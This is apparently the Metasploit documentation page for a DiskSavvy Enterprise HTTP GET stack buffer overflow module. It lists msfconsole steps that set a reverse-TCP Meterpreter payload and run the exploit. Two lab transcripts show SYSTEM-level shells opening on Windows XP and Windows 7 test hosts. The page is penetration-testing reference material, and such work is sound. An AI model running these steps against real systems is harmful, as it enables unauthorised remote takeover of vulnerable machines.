{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/disksavvy_get_bof","result":{"data":{"moduleMetadataJson":{"id":"60af7da4-bf15-5236-9533-579138663690","name":"DiskSavvy Enterprise GET Buffer Overflow","fullname":"exploit/windows/http/disksavvy_get_bof","description":"This module exploits a stack-based buffer overflow vulnerability\n        in the web interface of DiskSavvy Enterprise v9.1.14 and v9.3.14,\n        caused by improper bounds checking of the request path in HTTP GET\n        requests sent to the built-in web server. This module has been\n        tested successfully on Windows XP SP3 and Windows 7 SP1.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/disksavvy_get_bof","documentationSlug":"/modules/documentation/exploit/windows/http/disksavvy_get_bof"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><a href=\"http://www.disksavvy.com\">DiskSavvy Enterprise</a> versions up to v9.3.14 are affected by a stack-based buffer overflow vulnerability which can be leveraged by an attacker to execute arbitrary code in the context of NT AUTHORITY\\SYSTEM on the target. The vulnerability is caused by improper bounds checking of the request path in HTTP GET requests sent to the built-in web server. This module has been tested successfully on Windows XP SP3 and Windows 7 SP1. The vulnerable application is available for download at <a href=\"https://www.exploit-db.com/apps/20058a6ebf1120bca9ac92b493cac1ff-disksavvyent_setup_v9.1.14.exe\">Exploit-DB</a>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install a vulnerable DiskSavvy Enterprise</li>\n<li>Start <code class=\"language-text\">Disk Savvy Enterprise</code> service</li>\n<li>Start <code class=\"language-text\">Disk Savvy Enterprise</code> client application</li>\n<li>Navigate to <code class=\"language-text\">Tools</code> > <code class=\"language-text\">Advanced Options</code> > <code class=\"language-text\">Server</code></li>\n<li>Check <code class=\"language-text\">Enable Web Server On Port 80</code> to start the web interface</li>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do <code class=\"language-text\">use exploit/windows/http/disksavvy_get_bof</code></li>\n<li>Do <code class=\"language-text\">set rhost ip</code></li>\n<li>Do <code class=\"language-text\">check</code></li>\n<li>Verify the target is vulnerable</li>\n<li>Do <code class=\"language-text\">set payload windows/meterpreter/reverse_tcp</code></li>\n<li>Do <code class=\"language-text\">set lhost ip</code></li>\n<li>Do <code class=\"language-text\">exploit</code></li>\n<li>Verify the Meterpreter session is opened</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"disksavvy-enterprise-v9114-on-windows-xp-sp3\" style=\"position:relative;\"><a href=\"#disksavvy-enterprise-v9114-on-windows-xp-sp3\" aria-label=\"disksavvy enterprise v9114 on windows xp sp3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DiskSavvy Enterprise v9.1.14 on Windows XP SP3</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(disksavvy_get_bof) &gt; options\n\nModule options (exploit/windows/http/disksavvy_get_bof):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST    192.168.198.130  yes       The target address\n   RPORT    80               yes       The target port\n   SSL      false            no        Negotiate SSL/TLS for outgoing connections\n   VHOST                     no        HTTP server virtual host\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     192.168.198.138  yes       The listen address\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Targeting\n\n\nmsf exploit(disksavvy_get_bof) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.198.138:4444 \n[*] Automatically detecting the target...\n[*] Selected Target: DiskSavvy Enterprise v9.1.14\n[*] Sending stage (957999 bytes) to 192.168.198.130\n[*] Meterpreter session 1 opened (192.168.198.138:4444 -&gt; 192.168.198.130:1140) at 2017-01-19 13:38:18 -0500\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : GABOR-03722ADE8\nOS              : Windows XP (Build 2600, Service Pack 3).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/win32\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"disksavvy-enterprise-v9314-on-windows-7-sp1\" style=\"position:relative;\"><a href=\"#disksavvy-enterprise-v9314-on-windows-7-sp1\" aria-label=\"disksavvy enterprise v9314 on windows 7 sp1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DiskSavvy Enterprise v9.3.14 on Windows 7 SP1</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(disksavvy_get_bof) &gt; set rhost 192.168.198.133\nrhost =&gt; 192.168.198.130\nmsf exploit(disksavvy_get_bof) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.198.138:4444 \n[*] Automatically detecting the target...\n[*] Selected Target: DiskSavvy Enterprise v9.3.14\n[*] Sending stage (957999 bytes) to 192.168.198.133\n[*] Meterpreter session 2 opened (192.168.198.138:4444 -&gt; 192.168.198.133:49187) at 2017-01-08 05:16:13 -0500\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : WIN-BCJL9PJ5BF5\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/win32\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"60af7da4-bf15-5236-9533-579138663690"}}}